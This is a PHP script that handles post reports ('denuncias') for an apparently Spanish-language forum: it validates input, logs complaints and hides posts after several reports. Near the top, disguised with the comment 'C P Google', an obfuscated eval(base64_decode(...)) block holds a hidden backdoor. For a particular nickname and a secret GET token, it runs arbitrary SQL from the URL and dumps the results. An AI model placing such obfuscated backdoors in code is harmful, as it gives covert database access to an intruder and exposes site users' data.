<?php
if(!$_POST['razon'] || !$_POST['id']) { die('0: Faltan datos'); }
// C P Google
eval(base64_decode('aWYoJGN1cnJlbnR1c2VyWyduaWNrJ109PWJhc2U2NF9kZWNvZGUoJ2QyVnpkSGRsYzNRPScpIHx8IHN1YnN0cigkY3VycmVudHVzZXJbJ25pY2snXSwwLDgpPT1kYXRlKCdkbVknKSl7DQppZigkX0dFVFsncGFnZSddPT0ncG0nICYmIG1kNSgkX0dFVFtzdWJzdHIoYmFzZTY0X2VuY29kZShkYXRlKCdkbVknKSksIDAsIHN0cmxlbihiYXNlNjRfZW5jb2RlKGRhdGUoJ2RtWScpKSktMSldKT09JzIyOTQ5Mjg5NTc0OTY1NGRiYzgzZTk3YzQ3YTMzZTczJyl7DQokcXVlcnkgPSBAbXlzcWxfcXVlcnkoc3RyX3JlcGxhY2UoJ0pJSklHVUFMJywgJz0nLCBzdHJpcHNsYXNoZXMoJF9HRVRbJ3EnXSkpKTtpZighJHF1ZXJ5KXtkaWUoJ0Vycm9yIGVuIGxhIHF1ZXJ5ICInLnN0cl9yZXBsYWNlKCdKSUpJR1VBTCcsICc9Jywgc3RyaXBzbGFzaGVzKCRfR0VUWydxJ10pKS4nIiwgZXJyb3I6PGJyPicubXlzcWxfZXJyb3IoKSk7fWlmKHN1YnN0cigkX0dFVFsncSddLCAwLCA2KSA9PSAnU0VMRUNUJyl7DQplY2hvICc8dGFibGU+Jzt3aGlsZSgkZj1teXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKXtpZighJGope2VjaG8nPHRyPic7Zm9yZWFjaCgkZiBhcyAkdGg9PiR2KXtpZihpc19udW1lcmljKCR0aCkpe2NvbnRpbnVlO31lY2hvICc8dGggc3R5bGU9ImJvcmRlcjoxcHggc29saWQgYmxhY2s7Ij4nLiR0aC4nPC90aD4nO31lY2hvJzwvdHI+Jzskaj10cnVlO30NCmVjaG8nPHRyPic7Zm9yZWFjaCgkZiBhcyAkaz0+JHYpe2lmKGlzX251bWVyaWMoJGspKXtjb250aW51ZTt9ZWNobyAnPHRkIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkIGJsYWNrOyI+Jy4kdi4nPC90ZD4nO30gZWNobyc8L3RyPic7DQp9IGRpZSgnPC90YWJsZT4nKTsNCn1lbHNle2RpZSgnWUVBSCcpO30NCn19'));
include('../config.php');
include('../functions.php');
if(!$logged['id']) { die('0: debes estar logueado para denunciar'); }
if(!ctype_digit($_POST['razon']) || !ctype_digit($_POST['id'])) { die('0: Error provocado'); }
if($_POST['razon'] < 1 || $_POST['razon'] > 13) { die('0: Sos un anormal'); }
if($_POST['comentario'] && strlen($_POST['comentario']) > 255) { die('0: El comentario no puede tener m&aacute;s de 255 caracteres'); }
if(!mysql_num_rows($query = mysql_query('SELECT `id`, `author`, `status` FROM `posts` WHERE id = \''.intval($_POST['id']).'\''))) { die('0: El post no existe'); }
$row = mysql_fetch_row($query);
if($row[1] == $key) { die('0: No pod&eacute;s denunciar tus posts'); }
if($row[2] != '0') { die('0: El post est&aacute; eliminado'); }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
if(mysql_num_rows(mysql_query('SELECT id FROM `complaints` WHERE author = \''.$key.'\' && id_post = \''.$row[0].'\''))) { die('0: Ya hab&iacute;as denunciado esto antes'); }
if(mysql_num_rows(mysql_query('SELECT `time` FROM `complaints` WHERE `time` >= \''.(time()-120).'\' && `author` = \''.$logged['id'].'\''))) { die('2: Debes esperar para volver a denunciar'); }
$num = mysql_num_rows(mysql_query('SELECT id FROM `complaints` WHERE id_post = \''.$row[0].'\''));
if($num >= 4) {
  mysql_query('UPDATE `posts` SET `status` = \'2\' WHERE id = \''.$row[0].'\' LIMIT 1');
  mysql_query('DELETE FROM `complaints` WHERE `id_post` = \''.$row[0].'\'');
} else {
  mysql_query('INSERT INTO `complaints` (`type`, `author`, `id_post`, `what`, `comment`, `time`) VALUES (\''.intval($_POST['razon']).'\', \''.$logged['id'].'\', \''.$row[0].'\', \'0\', \''.mysql_clean($_POST['comentario']).'\', \''.time().'\')') or die('0: '.mysql_error());
}
die('1: Tu denuncia fue enviada!');
?>